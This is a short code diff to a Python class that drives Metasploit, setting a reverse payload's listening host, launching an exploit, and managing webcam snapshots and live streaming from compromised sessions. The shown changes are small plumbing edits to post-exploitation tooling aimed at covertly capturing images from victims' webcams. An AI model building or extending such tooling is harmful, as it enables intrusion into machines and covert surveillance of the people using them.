@@ -58,7 +58,7 @@ class MsfToolbox:
         pl['LHOST'] = self._ip
         pl['EXITFUNC'] = 'thread'
 
-        exploit.execute(payload=pl, ExitOnSession=False)
+        exploit.execute(payload=pl)
 
     def get_ip_address(self, ifname):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -179,6 +179,10 @@ class MsfToolbox:
         return self._has_webcam[session]
 
 
+    def disable_webcam(self, session):
+        self._has_webcam[session] = False
+
+
     def post_take_snapshot(self, session):
         shell = self.get_session_shell(session)
         snapshot_path = media.get_media_path(session, "snapshots")
@@ -212,8 +216,7 @@ class MsfToolbox:
 
 
     def live_update_frame(self, session):
-        shell = self.get_session_shell(session)
-        shell.update_streaming_flag()
+        pass
 
 
     def get_live_url(self):
